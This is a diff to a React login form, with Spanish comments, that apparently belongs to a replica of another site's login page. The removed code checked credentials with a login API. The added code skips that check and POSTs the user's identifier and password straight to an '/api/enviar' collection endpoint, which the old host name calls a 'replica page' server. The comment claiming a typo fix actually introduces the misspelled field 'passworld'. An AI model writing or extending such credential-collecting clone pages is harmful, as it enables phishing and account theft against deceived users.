@@ -16,24 +16,17 @@ export default function Login({ onLoginSuccess }) {
         if (emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone)) {
             setErrorMessage("");
 
+            const data = {
+                name: emailOrPhone,
+                passworld: password  // Corregido el error tipográfico
+            };
             try {
-                // Primera verificación con la API de login
-                const loginUrl = `http://dominio/api/login?email=${encodeURIComponent(emailOrPhone)}&password=${encodeURIComponent(password)}`;
-                const loginResponse = await fetch(loginUrl);
-                const loginResult = await loginResponse.json();
-
-                if (loginResponse.status !== 200) {
-                    setErrorMessage(loginResult.message || "Credenciales incorrectas");
-                    return;
-                }
-
-                // Segunda verificación con la API de envío
-                const data = { name: emailOrPhone, password };
-                const response = await fetch('https://replica-pagina-server-ul2z.onrender.com/api/enviar', {
+                const response = await fetch(`${process.env.REACT_APP_API_URL}/api/enviar`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data),
                 });
+                
 
                 const result = await response.json();
                 if (response.status === 201) {
